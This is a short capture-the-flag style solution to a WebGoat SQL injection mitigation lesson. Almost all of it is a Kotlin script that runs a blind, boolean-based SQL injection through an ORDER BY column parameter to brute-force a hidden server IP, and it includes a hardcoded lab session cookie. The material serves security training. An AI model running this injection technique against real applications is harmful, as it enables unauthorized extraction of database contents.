# (A1) SQL Injection (mitigation)

## Lesson 10 

Solution in Kotlin:

```kotlin
private const val HOST_PORT = "vernjan:8080"
private const val JSESSIONID = "575jCURJn0p6A5wvX0inPwCbdNMiXPQZioht7BRd"

fun main() {

    val httpClient = HttpClient.newBuilder()
        .version(HttpClient.Version.HTTP_1_1)
        .build()

    val jsonParser = JSONParser()

    for (i in 1..256) {
        val payload = URLEncoder.encode(
            "(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd') LIKE '$i.%' THEN id ELSE hostname END)",
            "UTF-8"
        )

        val request: HttpRequest = HttpRequest.newBuilder()
            .GET()
            .uri(URI.create("http://$HOST_PORT/WebGoat/SqlInjectionMitigations/servers?column=$payload"))
            .header("Cookie", "JSESSIONID=$JSESSIONID")
            .build()


        val response = httpClient.send(request, BodyHandlers.ofString())
        if (response.statusCode() == 200) {
            val servers: JSONArray = jsonParser.parse(response.body()) as JSONArray
            val firstServer = servers[0] as JSONObject
            if (firstServer.getValue("id") == "1") {
                println("The correct IP is $i.130.219.202")
                exitProcess(0)
            }
        } else {
            println("Error for $i: ${response.statusCode()}")
        }
    }
}
```